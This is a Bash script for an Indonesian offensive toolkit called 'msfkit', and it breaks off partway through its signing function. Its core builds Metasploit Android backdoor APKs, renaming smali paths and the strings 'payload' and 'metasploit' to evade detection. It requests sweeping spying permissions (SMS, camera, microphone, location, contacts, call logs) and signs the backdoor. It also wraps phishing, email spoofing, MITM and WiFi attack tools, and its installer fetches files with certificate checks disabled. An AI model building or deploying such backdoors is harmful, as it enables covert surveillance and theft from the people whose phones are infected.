
#!/bin/bash
# created by K1M4K-ID
# sertakan nama author jika ingin merecode, ethical hacking!!
# tools multi function, gunakan dengan bijak :D
# msfkit is a framework that creates & Generates & embeds apk payloads to penetrate android platform
# update terbaru tools msfkit, open source
# terima kasih.

# config, jangan di ubah
fixjava=$(_SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"' > /dev/null 2>&1)
host=$hostname
path=$(pwd)
mypath='${path}/Malware'
bul=$(date +"%B")
tan=$(date +"%d")
tim=$(date +"%T")
yer=$(date +"%Y")
waktu=$(printf "\033[31;1m$bul \033[31;1m$tan \033[37;1m$tim \033[31;1m$yer")
tput civis
clear

# var untuk aplikasi
#
VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'
echo ""

# banner tools ini.
baner(){
printf "\033[31;3m""""

   ▄▄▄▄███▄▄▄▄      ▄████████    ▄████████    ▄█   ▄█▄  ▄█      ███     
 ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███   ███ ▄███▀ ███  ▀█████████▄ 
 ███   ███   ███   ███    █▀    ███    █▀    ███▐██▀   ███▌    ▀███▀▀██  
 ███   ███   ███   ███         ▄███▄▄▄      ▄█████▀    ███▌     ███   ▀  \033[37;1m Version :\033[31;1m V.2\033[37;3m
 ███   ███   ███ ▀███████████ ▀▀███▀▀▀     ▀▀█████▄    ███▌     ███      \033[37;1m Code    :\033[31;1m <./K1M4K-ID>\033[37;3m
 ███   ███   ███          ███   ███          ███▐██▄   ███      ███      \033[37;1m support :\033[31;1m Cari Di Gugel\033[37;3m     
 ███   ███   ███    ▄█    ███   ███          ███ ▀███▄ ███      ███     
  ▀█   ███   █▀   ▄████████▀    ███          ███   ▀█▀ █▀      ▄████▀   
                                             ▀                          
\033[32;1m            		./Exploit~Droid
\033[31;1m   		 Sniffing, Spoofing, Mitm Attack
\033[37;1m	           Social Engineering Attack
"""
}

# animasi, 
spiner(){
bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
barlength=${#bar}
i=0
while ((i < 100));
do
	n=$((i*barlength / 100))
	printf "$ku1\r[%-${barlength}s]" "${bar:0:n}"
	((i += 1))
	sleep 0
	done
}

# cek koneksi internet
cekon(){
sleep 1
ping -c 1 8.8.8.8 > /dev/null 2>&1
if [ "$?" != "0" ]
then
        printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m memeriksa koneksi internet >>\033[31;1mfailed\n"
        sleep 0.025
        spiner
        echo
        printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m anda harus terhubung ke internet\033[31;1m :(\033[37;1m\n"
        sleep 0.025
        exit
        echo
        sleep 0.025
        else
        printf "\033[31;1m[\033[32;1m✔\033[31;1m]\033[37;1m check koneksi internet >>\033[32;1m connected\033[31;1m\n"
        sleep 0.025
fi
}

function remove()
{
    cd $path/Malware && rm -fr * >> /dev/null 2>&1
}

function reset(){
tput cnorm
}

trap ctrl_c INT
ctrl_c(){
clear
echo
printf "\033[34;1m[\033[33;1mCTRL+C\033[34;1m]\033[34;1m Detected, Trying To Exit.. \033[37;1m\n"
sleep 1
printf "\033[34;1m[\033[33;1m*\033[34;1m]\033[34;1m Stop service . . . initialize \033[37;1m\n"
sleep 1
reset remove
sleep 1
printf "\033[34;1m[\033[33;1m*\033[34;1m]\033[34;1m Thank you, for use this tools :) \033[37;1m\n"
sleep 1
keluar
exit
}

# check dependencies
function dependencies(){
if [ -f /etc/apt/sources.list.bckp ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m repository has been updates!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m add repository!\n"
    cp /etc/apt/sources.list /etc/apt/sources.list.bckp
    sleep 0.025
    echo "deb http://http.kali.org/kali kali-last-snapshot main contrib non-free" >> /etc/apt/sources.list
    printf "\033[37;1m[\033[31;1m*\033[37;1m]\033[37;1m updates repository!\n"
    apt-get update;clear
    fi
    sleep 0.025
    
    
if [ -f /usr/bin/msfconsole ]; then	
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m metasploit is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing metasploit!\n"
    apt-get install metasploit -y
    fi
    sleep 0.025

if [ -f /usr/bin/aapt ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m aapt is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing aapt!\n"
    apt-get install aapt -y
    fi
    sleep 0.025

if [ -f /usr/bin/zenity ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m zenity is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing zenity!\n"
    apt-get install zenity -y
    fi
    sleep 0.025

if [ -f /usr/bin/python3 ]; then
	  printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m python is already exists!\n"
	  else
	  printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing python3!\n"
	  apt-get install python3-pip
	  fi
	  sleep 0.025

if [ -f /usr/local/bin/apktool ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m apktool is ${GREEN}Installed.\n"
    else
    sleep 0.025
    printf "\033[37;1m[\033[31;1m*\033[37;1m]\033[37;1m remove apktool & update configurations, please wait...\n"
    apt-get --purge remove apktool -y &> /dev/null
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing apktool!\n"
    wget --no-check-certificate "https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool" -O /usr/local/bin/apktool && chmod +x /usr/local/bin/apktool
    wget --no-check-certificate "https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.6.1.jar" -O /usr/local/bin/apktool.jar && chmod +x /usr/local/bin/apktool.jar
    fi
    sleep 0.025

if [ -f /usr/bin/java ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m java is already exists!\n"
    else
    sleep 0.025
    printf "\033[37;1m[\033[31;1m*\033[37;1m]\033[37;1m remove java & update configurations, please wait...\n"
    apt-get --purge remove openjdk-11-jre openjdk-11-jdk -y &> /dev/null;apt autoremove -y &> /dev/null
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing java 8!\n"
    apt-get install nvidia-openjdk-8-jre -y;export JAVA_HOME="/usr/lib/jvm/java-8-openjdk-amd64";update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java" 1177
    fi
    sleep 0.025

if [ -f /usr/sbin/dsniff ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m arpspoof is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing arpspoof!\n"
    sudo apt-get install dsniff -y
    fi
    sleep 0.025

if [ -f /usr/bin/jarsigner ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m jarsigner is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing jarsigner!\n"
    apt-get install default-jdk -y
    fi
    sleep 0.025

if [ -f /usr/bin/zipalign ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m zipalign is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing zipalign!\n"
    apt-get install zipalign -y
    fi
    sleep 0.025
    
if [ -f Malware/.android/sign.jar ]; then
        printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m config is already exists!\033[31;1m\n"
        else
        printf "\033[37;1m[\033[31;1mx\033[37;1m] config tidak ditemukan, mengkonfigurasi sekarang..\033[31;1m\n"
        if [ ! -d ".android"  ]; then
        mkdir -p Malware/.android 
        mv -f key.tar.gz Malware/.android;cd Malware/.android;tar -xvf key.tar.gz &> /dev/null;rm -r key.tar.gz;cd keys;mv -f * ..;cd -;rm -r keys &> /dev/null
        fi
        sleep 0.025s
fi

if [ -f /usr/bin/adb ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m adb is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing adb!\n"
	apt-get install adb -y
    fi
    sleep 0.025

if [ -f /usr/bin/jarsigner ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m jarsigner is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing jarsigner!\n"
    apt-get install default-jdk -y
    fi
    sleep 0.025

# kali linux 2022.1 fix unable to locacate
if [ -f /usr/bin/scrcpy ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m scrcpy is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing scrcpy!\n"
    sudo apt-get install scrcpy -y
    fi
    sleep 0.025

if [ -d $path/data/out ]; then
			printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m path is already exists!\n"
			else
			printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m setup path & directory!\n"
			mkdir -p data/out

fi

}

# menu
function menu(){
        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m information gathering & osint\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m exploit attack metasploit\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m3\033[31;1m]\033[37;1m website aplication attack\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m4\033[31;1m]\033[37;1m wireless attack\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m5\033[31;1m]\033[37;1m sniffing & manInThemidle attack\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m6\033[31;1m]\033[37;1m social enggineering\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m exit\n\n"
        sleep 0.025
        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        echo
        sleep 0.025
}


# menu jika user xyz 1
function information_gathering(){
	clear
	baner
	echo
	echo
        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m sosial media recon [\033[32;1m instagram, facebook, twiter\033[37;1m ]\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m osint search by name\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m3\033[31;1m]\033[37;1m nmap detection scanning host\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m4\033[31;1m]\033[37;1m nmap scanning http sql-injection\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m5\033[31;1m]\033[37;1m nmap scanning wifi\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m6\033[31;1m]\033[37;1m whois lookup recon\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m7\033[31;1m]\033[37;1m DNS lookup recon\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m8\033[31;1m]\033[37;1m search directory\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m kembali\n"
        sleep 0.025
        echo
        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        sleep 0.025
        echo
}

# menu jika user xyz 2
function metasploit(){
    clear
    baner
    echo
    echo
        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m create payload android\033[31;1m\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m create listerner\033[31;1m\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m kembali\033[31;1m\n\n"
        sleep 0.025
        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        printf '\033[31;1m'
        sleep 0.025
        echo
}

# menu jika user xyz 3
function web_attack(){
    clear
    baner
    echo
    echo
        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m sql-injection  \033[31;1m(\033[32;1mfor scanning,attack and get database\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m xss-scanning \033[31;1m(\033[32;1mfor scanning xss\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m3\033[31;1m]\033[37;1m dirsearch \033[31;1m(\033[32;1mfor find hidden directory\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m4\033[31;1m]\033[37;1m subdomain enumeration \033[31;1m(\033[32;1mfor find subdomain\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m5\033[31;1m]\033[37;1m waff detection \033[31;1m(\033[32;1mchecking active firewall\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m6\033[31;1m]\033[37;1m cmseek \033[31;1m(\033[32;1mcms detection & exploitation suite\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m7\033[31;1m]\033[37;1m wps-scanning \033[31;1m(\033[32;1mwordpress scanning\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m8\033[31;1m]\033[37;1m whatweb \033[31;1m(\033[32;1mreconaiscence\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m back\033[31;1m\n\n"
        sleep 0.025
        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        sleep 0.025
        printf '\033[31;1m'

}

# user input 4 sniffing & MITM
function sadap(){
        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m airgeddon (hacking wifi with captive portal - fake ssid)\033[31;1m\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m evillimiter (hacking wifi - kill wifi)\033[31;1m\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m kembali\033[31;1m\n\n"
        sleep 0.025
        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        sleep 0.025
        printf '\033[31;1m'

}

# user input 5 MITM
function mitm(){
        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m bettercap (sniffing networking)\033[31;1m\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m MitM proxy (sniffing - http/https)\033[31;1m\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m kembali\033[31;1m\n\n"
        sleep 0.025
        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        sleep 0.025
        printf '\033[31;1m'
}

# user input 6 social engineering
function soceng(){
        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m email spoofing \033[31;1m(\033[32;1mBeta\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m phising attack \033[31;1m(\033[32;1mBeta\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m3\033[31;1m]\033[37;1m tracking location \033[31;1m(\033[32;1mBeta\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m kembali\033[31;1m\n\n"
        sleep 0.025
        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        sleep 0.025
        printf '\033[31;1m'
}



janda(){
printf '\033[31;1m'"""
░██████╗░█████╗░░█████╗░███╗░░██╗
██╔════╝██╔══██╗██╔══██╗████╗░██║
╚█████╗░██║░░██║██║░░██║██╔██╗██║
░╚═══██╗██║░░██║██║░░██║██║╚████║
██████╔╝╚█████╔╝╚█████╔╝██║░╚███║
╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚══╝

	 code by kimak
"""
}
keluar(){
printf '\033[31;1m'"""
███████╗██╗░░██╗██╗████████╗
██╔════╝╚██╗██╔╝██║╚══██╔══╝
█████╗░░░╚███╔╝░██║░░░██║░░░
██╔══╝░░░██╔██╗░██║░░░██║░░░
███████╗██╔╝╚██╗██║░░░██║░░░
╚══════╝╚═╝░░╚═╝╚═╝░░░╚═╝░░░

      code by kimak
"""
}

# runner numb 1
# information gathering
function search(){
	printf '\033[31;1m'
	echo
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
        sleep 2s
        clear
        bash $path/.data/recon/userrecon.sh
        mv *.txt data/out > /dev/null 2>&1
        printf '\033[31;1m'
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] back "'\033[34;1m')" xyz
        printf '\033[31;1m'
        sleep 0.025

}

# information gathering
function osint(){
	printf '\033[31;1m'
	echo
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[37;1m\n"
        sleep 2s
        clear
        python $path/.data/osint/osints.py
        printf '\033[31;1m'
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] back "'\033[34;1m')" xyz
        printf '\033[37;1m'
        echo
        sleep 0.025

}


# menu user memilih scan  nmap host root
function nmproot(){
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
    sleep 0.025
    echo
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> google.com\n"
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> 74.125.24.102\n"
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" target
    printf '\033[31;1m'
    printf '\033[37;1m'
    echo
    nmap -v -sS -Pn -O $target
    sleep 0.025
    printf '\033[31;1m'
    echo
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
        echo
        while true
        do
                if [ $scan = "y"  ];
                then
                nmproot

                else [ $scan != "y" ]
		run_information
                fi
        done
}

# menu user memilih scan  nmap host root
function nmpsql(){
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
    sleep 0.025
    echo
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> testphp.vulnweb.com\n"
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> 44.228.249.3\n"
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" target
    printf '\033[31;1m'
    printf '\033[37;1m'
    echo
    nmap -T4 -sV --script http-sql-injection $target -v
    sleep 0.025
    printf '\033[31;1m'
    echo
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
        echo
        while true
        do
                if [ $scan = "y"  ];
                then
                nmproot

                else [ $scan != "y" ]
		run_information			
                fi
        done
}


# menu user memilih scan nmap wifi
function nmpwifi(){
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
    sleep 0.025
    echo
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> 192.168.1.1/24\n"
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" target
    printf '\033[31;1m'
    printf '\033[37;1m'
    echo
    nmap -sP $target
    printf '\033[31;1m'
    sleep 0.025
    echo
            read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
            echo
            while true
            do
                    if [[ $scan = "y"  ]];
                    then
                    nmpwifi

                    else [[ $scan != "y"  ]];
                    run_information
                    fi
            done

}

wgetfind()
{
  printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
  sleep 0
  echo
  printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> paypal.com\n"
  printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
  read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" url
  printf '\033[31;1m'
  printf '\033[37;1m'
  echo
  wget -qO- $url | tr \" \\n | grep -Eio "https?://[^;),'\\]+" | sort -u | nl
  sleep 0
  printf '\033[31;1m'
  echo
          read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
          echo
            while true
            do
                  if [[ $scan = "y"  ]];
                  then
                  wgetfind

                  else [[ $scan != "y" ]]
                  run_information
                  fi
            done
}

# menu user memilih whois
function whs(){
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
    sleep 0.025
    echo
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> google.com\n"
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" target
    printf '\033[31;1m'
    echo
    whois $target
    sleep 0.025
    printf '\033[31;1m'
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
    echo
        while true
        do
            if [ $scan = "y"  ];
            then
            whs

            else
            run_information
            fi
        done

}
# menu user memilih DNS
function dns(){
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
    sleep 0.025
    echo
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> google.com\n"
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" target
    printf '\033[31;1m'
    dnsenum $target
    sleep 0.025
    printf '\033[31;1m'
    echo
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
        echo
                if [ $scan = "y"  ];
                then
                dns
                else [ $scan != "y" ]
                run_information
                fi
}

function run_information(){
    information_gathering
    while true
    do
    case $xyz in
        1) search;;
        2) osint;;
        3) nmproot;;
        4) nmpsql;;
        5) nmpwifi;;
        6) whs;;
        7) dns;;
        8) wgetfind;;
        0) runer;;
        *) printf "\033[31;1m[\033[32;1m!\033[31;1m]\033[37;1m please input in options . . .\n"
           sleep 3;run_information;;
    esac
    done

}

# runner numb 2
# exploit metasploit
eth0_ip=$(ifconfig eth0|grep "inet"|awk 'NR == 1 {print $2}')
wlan0_ip=$(ifconfig wlan0|grep "inet"|awk 'NR == 1 {print $2}')
# fungsi seting ip dan port
function sets(){
        clear
        baner
        printf '\033[31;1m'
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] ip Backdoor\033[31;1m\n"
        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda : $eth0_ip  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda : $wlan0_ip (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
        echo
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan lhost  : "'\033[34;1m')" lh
        printf '\033[31;1m'
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan port   : "'\033[34;1m')" lp
        printf '\033[31;1m'
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . . please wait\033[31;1m\n"
        sleep 2
}

#fungsi seting network original
#
function sets_original(){
        clear
        baner
        printf '\033[31;1m'
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] ip Backdoor\033[31;1m\n"
        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda : $eth0_ip  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda : $wlan0_ip (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
        echo
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan lhost  : "'\033[34;1m')" lh
        printf '\033[31;1m'
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan port   : "'\033[34;1m')" lp
        printf '\033[31;1m'
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] nama Backdoor  : "'\033[34;1m')" nama
        printf '\033[31;1m'
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . . please wait\033[31;1m\n"
        printf '\033[31;1m'
        echo
        sleep 2
}

# fungsi listener untuk eksekusi Backdoor
function listener_kali(){
        clear
        baner
        tun0_ip=$(ifconfig tun0|grep "inet"|awk 'NR == 1 {print $2}')
        printf '\033[31;1m'
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] ip listener\033[31;1m\n"
        sleep 0.025s
        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda : $eth0_ip  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda : $wlan0_ip (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
        printf "\033[37;1m[\033[32;1m*\033[37;1m] ip forward anda       : $tun0_ip (\033[31;1mforward\033[37;1m)\n"
        printf '\033[31;1m'
        echo
        sleep 0.025
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan lhost  : "'\033[34;1m')" lh
        printf '\033[31;1m'
        sleep 0.025
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan port   : "'\033[34;1m')" lp
        printf '\033[31;1m'
        sleep 0.025
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] starting apache2 && database (\033[32;1mruning\033[37;1m)\n"
        printf '\033[31;1m'
        sleep 0.025
        service apache2 start > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] apache server\033[31;1m [\033[32;1mOK\033[31;1m]\n"
        sleep 0.025
        service postgresql start > /dev/null
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] postgresql\033[31;1m   [\033[32;1mOK\033[31;1m]\n"
        sleep 0.025
        printf "\033[37;1m[\033[32;1m*\033[37;1m] starting metasploit listener . . .\033[31;1m\n"
        sleep 2
        clear
}

# sign Backdoor file manual inject
#
function sign_orig(){
        printf "\033[37;1m[\033[32;1m*\033[37;1m] sign your backdoor\033[31;1m\n"
        java -jar $path/Malware/.android/sign.jar ori.apk;mv ori.s.apk ori.apk > /dev/null 2>&1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] signed backdoor,\033[32;1m succesfully\033[31;1m\n"
        sleep 0.025s
        printf "\033[37;1m[\033[32;1m*\033[37;1m] verification your backdoor, please wait\033[31;1m\n"
        sleep 0.025s
        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle your backdoor\033[31;1m\n"
        sleep 0.025s
        zipalign 4 ori.apk $nama.apk > /dev/null 2>&1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] verification, \033[32;1m succesfully\033[31;1m\n"
        sleep 3
}

# sign Backdoor
#
function sign(){        
        printf "\033[37;1m[\033[32;1m*\033[37;1m] sign your backdoor\033[31;1m\n"
